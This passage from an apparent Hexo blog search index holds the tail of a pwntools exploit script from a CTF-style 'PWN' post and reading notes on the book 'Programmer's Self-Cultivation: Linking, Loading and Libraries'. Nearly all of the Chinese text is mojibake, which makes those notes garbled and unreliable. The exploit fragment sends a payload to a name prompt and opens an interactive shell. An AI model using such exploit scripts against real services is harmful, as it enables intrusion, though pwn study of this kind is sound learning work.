class="line">c.recvuntil(<span class="string">b&#x27;GIVE ME YOUR NAME!\n&#x27;</span>)</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‡æœŸå­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»:é“¾æ¥è£…è½½ä¸åº“ã€‹ç¬”è®°</title>
      <link href="/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>The more u learn, the less u know.</p></blockquote><span id="more"></span><h1 id="ä¸€ã€æœ¬ä¹¦æ€»æ¦‚"><a href="#ä¸€ã€æœ¬ä¹¦æ€»æ¦‚" class="headerlink" title="ä¸€ã€æœ¬ä¹¦æ€»æ¦‚"></a>ä¸€ã€æœ¬ä¹¦æ€»æ¦‚</h1><h2 id="1-å¤§è‡´å†…å®¹"><a href="#1-å¤§è‡´å†…å®¹" class="headerlink" title="1.å¤§è‡´å†…å®¹"></a>1.å¤§è‡´å†…å®¹</h2><blockquote><ol><li>æœ¬ä¹¦å°†è¯¦ç»†æè¿°ç°åœ¨æµè¡Œçš„Windowså’ŒLinuxæ“ä½œç³»ç»Ÿä¸‹å„è‡ªçš„å¯æ‰§è¡Œæ–‡ä»¶ã€ç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼›</li><li>æ™®é€šC/C++ç¨‹åºä»£ç å¦‚ä½•è¢«ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶åŠç¨‹åºåœ¨ç›®æ ‡æ–‡ä»¶ä¸­å¦‚ä½•å­˜å‚¨ï¼›</li><li>ç›®æ ‡æ–‡ä»¶å¦‚ä½•è¢«é“¾æ¥å™¨é“¾æ¥åˆ°ä¸€èµ·ï¼Œå¹¶ä¸”å½¢æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼›</li><li>ç›®æ ‡æ–‡ä»¶åœ¨é“¾æ¥æ—¶ç¬¦å·å¤„ç†ã€é‡å®šä½å’Œåœ°å€åˆ†é…å¦‚ä½•è¿›è¡Œï¼›</li><li>å¯æ‰§è¡Œæ–‡ä»¶å¦‚ä½•è¢«è£…è½½å¹¶ä¸”æ‰§è¡Œï¼›</li><li>å¯æ‰§è¡Œæ–‡ä»¶ä¸è¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´ä¹‹é—´å¦‚ä½•æ˜ å°„ï¼›</li><li>ä»€ä¹ˆæ˜¯åŠ¨æ€é“¾æ¥ï¼Œä¸ºä»€ä¹ˆè¦è¿›è¡ŒåŠ¨æ€é“¾æ¥ï¼›</li><li>Windowså’ŒLinuxå¦‚ä½•è¿›è¡ŒåŠ¨æ€é“¾æ¥åŠåŠ¨æ€é“¾æ¥æ—¶çš„ç›¸å…³é—®é¢˜ï¼›</li><li>ä»€ä¹ˆæ˜¯å †ï¼Œä»€ä¹ˆæ˜¯æ ˆï¼›</li><li>å‡½æ•°è°ƒç”¨æƒ¯ä¾‹ï¼›</li><li>è¿è¡Œåº“ï¼ŒGlibcå’ŒMSVC CRTçš„å®ç°åˆ†æï¼›</li><li>ç³»ç»Ÿè°ƒç”¨ä¸APIï¼›</li><li>æœ€åæˆ‘ä»¬è‡ªå·±è¿˜å®ç°äº†ä¸€ä¸ªMini CRTã€‚</li></ol></blockquote><h2 id="2-æ–‡ç« ç›®å½•"><a href="#2-æ–‡ç« ç›®å½•" class="headerlink" title="2.æ–‡ç« ç›®å½•"></a>2.æ–‡ç« ç›®å½•</h2><h3 id="ç¬¬1ç« -æ¸©æ•…è€ŒçŸ¥æ–°"><a href="#ç¬¬1ç« -æ¸©æ•…è€ŒçŸ¥æ–°" class="headerlink" title="ç¬¬1ç«  æ¸©æ•…è€ŒçŸ¥æ–°"></a>ç¬¬1ç«  æ¸©æ•…è€ŒçŸ¥æ–°</h3><p>â€‹        ä»‹ç»åŸºæœ¬çš„èƒŒæ™¯çŸ¥è¯†ï¼ŒåŒ…æ‹¬ç¡¬ä»¶ã€æ“ä½œç³»ç»Ÿã€çº¿ç¨‹ç­‰ã€‚</p><h3 id="ç¬¬2ç« -ç¼–è¯‘å’Œé“¾æ¥"><a href="#ç¬¬2ç« -ç¼–è¯‘å’Œé“¾æ¥" class="headerlink" title="ç¬¬2ç«  ç¼–è¯‘å’Œé“¾æ¥"></a>ç¬¬2ç«  ç¼–è¯‘å’Œé“¾æ¥</h3><p>â€‹        ä»‹ç»ç¼–è¯‘å’Œé“¾æ¥çš„åŸºæœ¬æ¦‚å¿µå’Œæ­¥éª¤ã€‚</p><h3 id="ç¬¬3ç« -ç›®æ ‡æ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆ"><a href="#ç¬¬3ç« -ç›®æ ‡æ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆ" class="headerlink" title="ç¬¬3ç«  ç›®æ ‡æ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆ"></a>ç¬¬3ç«  ç›®æ ‡æ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆ</h3><p>â€‹        ä»‹ç»COFFç›®æ ‡æ–‡ä»¶æ ¼å¼å’Œæºä»£ç ç¼–è¯‘åå¦‚ä½•åœ¨ç›®æ ‡æ–‡ä»¶ä¸­å­˜å‚¨ã€‚</p><h3 id="ç¬¬4ç« -é™æ€é“¾æ¥"><a href="#ç¬¬4ç« -é™æ€é“¾æ¥" class="headerlink" title="ç¬¬4ç«  é™æ€é“¾æ¥"></a>ç¬¬4ç«  é™æ€é“¾æ¥</h3><p>â€‹        ä»‹ç»é™æ€é“¾æ¥ä¸é™æ€åº“é“¾æ¥çš„è¿‡ç¨‹å’Œæ­¥éª¤ã€‚</p><h3 id="ç¬¬5ç« -Windows-PE-COFF"><a href="#ç¬¬5ç« -Windows-PE-COFF" class="headerlink" title="ç¬¬5ç«  Windows PE/COFF"></a>ç¬¬5ç«  Windows PE/COFF</h3><p>â€‹        ä»‹ç»Windowså¹³å°çš„ç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚</p><h3 id="ç¬¬6ç« -å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ä¸è¿›ç¨‹"><a href="#ç¬¬6ç« -å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ä¸è¿›ç¨‹" class="headerlink" title="ç¬¬6ç«  å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ä¸è¿›ç¨‹"></a>ç¬¬6ç«  å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ä¸è¿›ç¨‹</h3><p>â€‹        ä»‹ç»è¿›ç¨‹çš„æ¦‚å¿µã€è¿›ç¨‹åœ°å€ç©ºé—´çš„åˆ†å¸ƒå’Œå¯æ‰§è¡Œæ–‡ä»¶æ˜ å°„è£…è½½è¿‡ç¨‹ã€‚</p><h3 id="ç¬¬7ç« -åŠ¨æ€é“¾æ¥"><a href="#ç¬¬7ç« -åŠ¨æ€é“¾æ¥" class="headerlink" title="ç¬¬7ç«  åŠ¨æ€é“¾æ¥"></a>ç¬¬7ç«  åŠ¨æ€é“¾æ¥</h3><p>â€‹        ä»¥Linuxä¸‹çš„.soå…±äº«åº“ä¸ºåŸºç¡€è¯¦ç»†åˆ†æäº†åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ã€‚</p><h3 id="ç¬¬8ç« -Linuxå…±äº«åº“çš„ç»„ç»‡"><a href="#ç¬¬8ç« -Linuxå…±äº«åº“çš„ç»„ç»‡" class="headerlink" title="ç¬¬8ç«  Linuxå…±äº«åº“çš„ç»„ç»‡"></a>ç¬¬8ç«  Linuxå…±äº«åº“çš„ç»„ç»‡</h3><p>â€‹        ä»‹ç»Linuxä¸‹å…±äº«åº“æ–‡ä»¶çš„åˆ†å¸ƒå’Œç»„ç»‡ã€‚</p><h3 id="ç¬¬9ç« -Windowsä¸‹çš„åŠ¨æ€é“¾æ¥"><a href="#ç¬¬9ç« -Windowsä¸‹çš„åŠ¨æ€é“¾æ¥" class="headerlink" title="ç¬¬9ç«  Windowsä¸‹çš„åŠ¨æ€é“¾æ¥"></a>ç¬¬9ç«  Windowsä¸‹çš„åŠ¨æ€é“¾æ¥</h3><p>â€‹        ä»‹ç»Windowsç³»ç»Ÿä¸‹DLLåŠ¨æ€é“¾æ¥æœºåˆ¶ã€‚</p><h3 id="ç¬¬10ç« -å†…å­˜"><a href="#ç¬¬10ç« -å†…å­˜" class="headerlink" title="ç¬¬10ç«  å†…å­˜"></a>ç¬¬10ç«  å†…å­˜</h3><p>â€‹        ä¸»è¦ä»‹ç»å †ä¸æ ˆï¼Œå †çš„åˆ†é…ç®—æ³•ï¼Œå‡½æ•°è°ƒç”¨æ ˆåˆ†å¸ƒã€‚</p><h3 id="ç¬¬11ç« -è¿è¡Œåº“"><a href="#ç¬¬11ç« -è¿è¡Œåº“" class="headerlink" title="ç¬¬11ç«  è¿è¡Œåº“"></a>ç¬¬11ç«  è¿è¡Œåº“</h3><p>â€‹        ä¸»è¦ä»‹ç»è¿è¡Œåº“çš„æ¦‚å¿µã€C/C++è¿è¡Œåº“ã€Glibcå’ŒMSVC CRTã€è¿è¡Œåº“å¦‚ä½•å®ç°C++å…¨å±€æ„é€ å’Œææ„åŠä»¥fread()åº“å‡½æ•°ä¸ºä¾‹å¯¹è¿è¡Œåº“è¿›è¡Œå‰–æã€‚</p><h3 id="ç¬¬12ç« -ç³»ç»Ÿè°ƒç”¨ä¸API"><a href="#ç¬¬12ç« -ç³»ç»Ÿè°ƒç”¨ä¸API" class="headerlink" title="ç¬¬12ç«  ç³»ç»Ÿè°ƒç”¨ä¸API"></a>ç¬¬12ç«  ç³»ç»Ÿè°ƒç”¨ä¸API</h3><p>â€‹        ä¸»è¦ä»‹ç»Linuxå’ŒWindowsçš„ç³»ç»Ÿè°ƒç”¨åŠWindows çš„APIã€‚</p><h3 id="ç¬¬13ç« -è¿è¡Œåº“å®ç°"><a href="#ç¬¬13ç« -è¿è¡Œåº“å®ç°" class="headerlink" title="ç¬¬13ç«  è¿è¡Œåº“å®ç°"></a>ç¬¬13ç«  è¿è¡Œåº“å®ç°</h3><p>â€‹        æœ¬ç« ä¸»è¦å®ç°äº†ä¸€ä¸ªæ”¯æŒå †ã€åŸºæœ¬æ–‡ä»¶æ“ä½œã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€åŸºæœ¬è¾“å…¥è¾“å‡ºã€C++ new/deleteã€C++ stringã€C++å…¨å±€æ„é€ å’Œææ„çš„Mini CRTã€‚</p><h1 id="äºŒã€ç¬¬ä¸€ç« "><a href="#äºŒã€ç¬¬ä¸€ç« " class="headerlink" title="äºŒã€ç¬¬ä¸€ç« "></a>äºŒã€ç¬¬ä¸€ç« </h1><h2 id="1-ç”±Hello-Worldç¨‹åºå¼•å‡ºçš„é—®é¢˜"><a href="#1-ç”±Hello-Worldç¨‹åºå¼•å‡ºçš„é—®é¢˜" class="headerlink" title="1.ç”±Hello Worldç¨‹åºå¼•å‡ºçš„é—®é¢˜"></a>1.ç”±Hello Worldç¨‹åºå¼•å‡ºçš„é—®é¢˜</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>ç¨‹åºä¸ºä»€ä¹ˆè¦è¢«ç¼–è¯‘å™¨ç¼–è¯‘äº†ä¹‹åæ‰å¯ä»¥è¿è¡Œï¼Ÿ</li><li>ç¼–è¯‘å™¨åœ¨æŠŠCè¯­è¨€ç¨‹åºè½¬æ¢æˆå¯ä»¥æ‰§è¡Œçš„æœºå™¨ç çš„è¿‡ç¨‹ä¸­åšäº†ä»€ä¹ˆï¼Œæ€ä¹ˆåšçš„ï¼Ÿ</li><li>æœ€åç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶é‡Œé¢æ˜¯ä»€ä¹ˆï¼Ÿé™¤äº†æœºå™¨ç è¿˜æœ‰ä»€ä¹ˆï¼Ÿå®ƒä»¬æ€ä¹ˆå­˜æ”¾çš„ï¼Œæ€ä¹ˆç»„ç»‡çš„ï¼Ÿ</li><li>#include &lt;stdio.h&gt;æ˜¯ä»€ä¹ˆæ„æ€ï¼ŸæŠŠstdio.håŒ…å«è¿›æ¥æ„å‘³ç€ä»€ä¹ˆï¼ŸCè¯­è¨€åº“åˆæ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ€ä¹ˆå®ç°çš„ï¼Ÿ</li><li>ä¸åŒçš„ç¼–è¯‘å™¨ï¼ˆMicrosoft VCã€GCCï¼‰å’Œä¸åŒçš„ç¡¬ä»¶å¹³å°ï¼ˆx86ã€SPARCã€MIPSã€ARMï¼‰ï¼Œä»¥åŠä¸åŒçš„æ“ä½œç³»ç»Ÿï¼ˆWindowsã€Linuxã€UNIXã€Solarisï¼‰ï¼Œæœ€ç»ˆç¼–è¯‘å‡ºæ¥çš„ç»“æœä¸€æ ·å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</li><li>Hello Worldç¨‹åºæ˜¯æ€ä¹ˆè¿è¡Œèµ·æ¥çš„ï¼Ÿæ“ä½œç³»ç»Ÿæ˜¯æ€ä¹ˆè£…è½½å®ƒçš„ï¼Ÿå®ƒä»å“ªå„¿å¼€å§‹æ‰§è¡Œï¼Œåˆ°å“ªå„¿ç»“æŸï¼Ÿmainå‡½æ•°ä¹‹å‰å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿmainå‡½æ•°ç»“æŸä»¥ååˆå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</li><li>å¦‚æœæ²¡æœ‰æ“ä½œç³»ç»Ÿï¼ŒHello Worldå¯ä»¥è¿è¡Œå—ï¼Ÿå¦‚æœè¦åœ¨ä¸€å°æ²¡æœ‰æ“ä½œç³»ç»Ÿçš„æœºå™¨ä¸Šè¿è¡ŒHello Worldéœ€è¦ä»€ä¹ˆï¼Ÿåº”è¯¥æ€ä¹ˆå®ç°ï¼Ÿ</li><li>printfæ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿå®ƒä¸ºä»€ä¹ˆå¯ä»¥æœ‰ä¸å®šæ•°é‡çš„å‚æ•°ï¼Ÿä¸ºä»€ä¹ˆå®ƒèƒ½å¤Ÿåœ¨ç»ˆç«¯ä¸Šè¾“å‡ºå­—ç¬¦ä¸²ï¼Ÿ</li><li>Hello Worldç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œå®ƒåœ¨å†…å­˜ä¸­æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Ÿ</li></ol></blockquote><p>â€‹    å¯¹äºæˆ‘åœ¨ä¸€å¹´åŠå‰å°±å¾ˆç†Ÿæ‚‰çš„ç®€å•çš„Cç¨‹åºï¼Œä¸Šé¢çš„9ä¸ªé—®é¢˜æˆ‘åªèƒ½å¾ˆæµ…åœ°å›ç­”å‡ ä¸ªï¼Œå¤§éƒ¨åˆ†éƒ½éå¸¸æ¨¡æ£±ä¸¤å¯ï¼Œå¸Œæœ›èƒ½å¤Ÿåœ¨é˜…è¯»æœ¬ä¹¦çš„åŒæ—¶èƒ½å¤Ÿæå‡æˆ‘å¯¹Hello Worldç¨‹åºçš„ç†è§£å¹¶èƒ½å¤Ÿå¼€å§‹å›ç­”ä¸Šé¢ä¹ä¸ªé—®é¢˜å§ã€‚(å¦‚æœè¿˜èƒ½å¤Ÿæå‡ºè‡ªå·±å‘ç°çš„é—®é¢˜é‚£å°±æ›´å¥½äº†ã€‚)</p><h2 id="2-å†å›é¦–ï¼šè®¡ç®—æœºç›¸å…³åŸºç¡€çŸ¥è¯†"><a href="#2-å†å›é¦–ï¼šè®¡ç®—æœºç›¸å…³åŸºç¡€çŸ¥è¯†" class="headerlink" title="2.å†å›é¦–ï¼šè®¡ç®—æœºç›¸å…³åŸºç¡€çŸ¥è¯†"></a>2.å†å›é¦–ï¼šè®¡ç®—æœºç›¸å…³åŸºç¡€çŸ¥è¯†</h2><p><strong>1.</strong> æ—©æœŸçš„è®¡ç®—æœºæ²¡æœ‰å¾ˆå¤æ‚çš„å›¾å½¢åŠŸèƒ½ï¼ŒCPUçš„æ ¸å¿ƒé¢‘ç‡ä¹Ÿä¸é«˜ï¼Œè·Ÿå†…å­˜çš„é¢‘ç‡ä¸€æ ·ï¼Œå®ƒä»¬éƒ½æ˜¯ç›´æ¥è¿æ¥åœ¨åŒä¸€ä¸ªæ€»çº¿ï¼ˆBusï¼‰ä¸Šçš„ã€‚ä¸ºäº†åè°ƒI/Oè®¾å¤‡ä¸æ€»çº¿ä¹‹é—´çš„é€Ÿåº¦ï¼Œä¹Ÿä¸ºäº†èƒ½å¤Ÿè®©CPUèƒ½å¤Ÿå’ŒI/Oè®¾å¤‡è¿›è¡Œé€šä¿¡ï¼Œä¸€èˆ¬æ¯ä¸ªè®¾å¤‡éƒ½ä¼šæœ‰ä¸€ä¸ªç›¸åº”çš„I/Oæ§åˆ¶å™¨ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.6kie90plsps0.webp"></p><p>â€‹                                        ï¼ˆå›¾1-1 æ—©æœŸçš„è®¡ç®—æœºç¡¬ä»¶ç»“æ„ ï¼‰</p><p><strong>2.åŒ—æ¡¥ä¸å—æ¡¥èŠ¯ç‰‡</strong>ï¼šä¸ºäº†åè°ƒCPUã€å†…å­˜å’Œé«˜é€Ÿçš„å›¾å½¢è®¾å¤‡ï¼Œäººä»¬ä¸“é—¨è®¾è®¡äº†ä¸€ä¸ªé«˜é€Ÿçš„åŒ—æ¡¥èŠ¯ç‰‡ï¼ˆNorthbridgeï¼ŒPCI Bridgeï¼‰ï¼Œä»¥ä¾¿å®ƒä»¬ä¹‹é—´èƒ½å¤Ÿé«˜é€Ÿåœ°äº¤æ¢æ•°æ®ã€‚ç”±äºåŒ—æ¡¥è¿è¡Œçš„é€Ÿåº¦éå¸¸é«˜ï¼Œæ‰€æœ‰ç›¸å¯¹ä½é€Ÿçš„è®¾å¤‡å¦‚æœå…¨éƒ½ç›´æ¥è¿æ¥åœ¨åŒ—æ¡¥ä¸Šï¼ŒåŒ—æ¡¥æ—¢é¡»å¤„ç†é«˜é€Ÿè®¾å¤‡ï¼Œåˆé¡»å¤„ç†ä½é€Ÿè®¾å¤‡ï¼Œè®¾è®¡å°±ä¼šååˆ†å¤æ‚ã€‚äºæ˜¯äººä»¬åˆè®¾è®¡äº†ä¸“é—¨å¤„ç†ä½é€Ÿè®¾å¤‡çš„å—æ¡¥ï¼ˆSouthbridgeï¼‰èŠ¯ç‰‡ï¼Œç£ç›˜ã€USBã€é”®ç›˜ã€é¼ æ ‡ç­‰è®¾å¤‡éƒ½è¿æ¥åœ¨å—æ¡¥ä¸Šï¼Œç”±å—æ¡¥å°†å®ƒä»¬æ±‡æ€»åè¿æ¥åˆ°åŒ—æ¡¥ä¸Šã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.580j3n7mklfk.webp"></p><p><strong>3.SMPä¸å¤šæ ¸</strong>ï¼š</p><ul><li><strong>å¯¹ç§°å¤šå¤„ç†å™¨ï¼ˆSMPï¼ŒSymmetrical Multi Processingï¼‰</strong>ï¼Œç®€å•åœ°è®²å°±æ˜¯æ¯ä¸ªCPUåœ¨ç³»ç»Ÿä¸­æ‰€å¤„çš„åœ°ä½å’Œæ‰€å‘æŒ¥çš„åŠŸèƒ½éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯ç›¸äº’å¯¹ç§°çš„ã€‚</li><li>ç†è®ºä¸Šè®²ï¼Œå¢åŠ CPUçš„æ•°é‡å°±å¯ä»¥æé«˜è¿ç®—é€Ÿåº¦ï¼Œå¹¶ä¸”ç†æƒ³æƒ…å†µä¸‹ï¼Œé€Ÿåº¦çš„æé«˜ä¸CPUçš„æ•°é‡æˆæ­£æ¯”ã€‚ä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºå¹¶ä¸æ˜¯éƒ½èƒ½åˆ†è§£æˆè‹¥å¹²ä¸ªå®Œå…¨ä¸ç›¸å¹²çš„å­é—®é¢˜ã€‚</li><li>å¤šæ ¸å¤„ç†å™¨<strong>ï¼ˆMulti-core Processorï¼‰</strong>å®é™…ä¸Šå°±æ˜¯SMPçš„ç®€åŒ–ç‰ˆï¼Œå½“ç„¶å®ƒä»¬åœ¨ç»†èŠ‚ä¸Šè¿˜æœ‰ä¸€äº›å·®åˆ«ï¼Œåªæ˜¯å¤šæ ¸å’ŒSMPåœ¨ç¼“å­˜å…±äº«ç­‰æ–¹é¢æœ‰ç»†å¾®çš„å·®åˆ«ï¼Œä½¿å¾—ç¨‹åºåœ¨ä¼˜åŒ–ä¸Šå¯ä»¥æœ‰é’ˆå¯¹æ€§åœ°å¤„ç†ã€‚</li></ul><p><strong>4.ç³»ç»Ÿè½¯ä»¶</strong>ï¼š</p><ul><li>ä¼ ç»Ÿæ„ä¹‰ä¸Šä¸€èˆ¬å°†ç”¨äºç®¡ç†è®¡ç®—æœºæœ¬èº«çš„è½¯ä»¶ç§°ä¸ºç³»ç»Ÿè½¯ä»¶ï¼Œä»¥åŒºåˆ«æ™®é€šçš„åº”ç”¨ç¨‹åºã€‚</li><li>ä¸€ç±»æ˜¯å¹³å°æ€§çš„ï¼Œæ¯”å¦‚æ“ä½œç³»ç»Ÿå†…æ ¸ã€é©±åŠ¨ç¨‹åºã€è¿è¡Œåº“å’Œæ•°ä»¥åƒè®¡çš„ç³»ç»Ÿå·¥å…·ã€‚</li><li>å¦å¤–ä¸€ç±»æ˜¯ç”¨äºç¨‹åºå¼€å‘çš„ï¼Œæ¯”å¦‚ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨ã€é“¾æ¥å™¨ç­‰å¼€å‘å·¥å…·å’Œå¼€å‘åº“ã€‚</li><li>è®¡ç®—æœºç³»ç»Ÿè½¯ä»¶ä½“ç³»ç»“æ„é‡‡ç”¨ä¸€ç§å±‚çš„ç»“æ„ã€‚</li><li>Linuxä½¿ç”¨0x80å·ä¸­æ–­ä½œä¸ºç³»ç»Ÿè°ƒç”¨æ¥å£ã€‚</li></ul><p><strong>5.æ“ä½œç³»ç»Ÿ</strong>ï¼š</p><ul><li><p>æ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªåŠŸèƒ½æ˜¯æä¾›æŠ½è±¡çš„æ¥å£ï¼Œå¦å¤–ä¸€ä¸ªä¸»è¦åŠŸèƒ½æ˜¯ç®¡ç†ç¡¬ä»¶èµ„æºã€‚</p></li><li><p>å¤šé“ç¨‹åºï¼ˆMultiprogrammingï¼‰</p></li><li><p>åˆ†æ—¶ç³»ç»Ÿï¼ˆTime-Sharing Systemï¼‰</p></li><li><p><strong>å¤šä»»åŠ¡ï¼ˆMulti-taskingï¼‰ç³»ç»Ÿ</strong>ï¼š</p></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3mfrj89mh1mo.webp"></p><ul><li>é©±åŠ¨ç¨‹åºå¯ä»¥çœ‹ä½œæ˜¯æ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå¾€å¾€è·Ÿæ“ä½œç³»ç»Ÿå†…æ ¸ä¸€èµ·è¿è¡Œåœ¨ç‰¹æƒçº§ï¼Œä½†å®ƒåˆä¸æ“ä½œç³»ç»Ÿå†…æ ¸ä¹‹é—´æœ‰ä¸€å®šçš„ç‹¬ç«‹æ€§ï¼Œä½¿å¾—é©±åŠ¨ç¨‹åºæœ‰æ¯”è¾ƒå¥½çš„çµæ´»æ€§ã€‚</li></ul><p><strong>6.ä¸€æ¬¡è¯»å–æ–‡ä»¶ä¾‹å­çš„åˆ†æï¼š</strong></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.5bths8zui874.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.7elw6au6z4zk.webp"></p><p>7.ä¸€äº›åè¯ï¼š</p><ul><li><p>åˆ†æ®µï¼ˆSegmentationï¼‰</p></li><li><p>åˆ†é¡µï¼ˆPagingï¼‰</p></li></ul><hr><p>P34 2023å¹´1æœˆ11æ—¥</p><hr>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯»ä¹¦ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
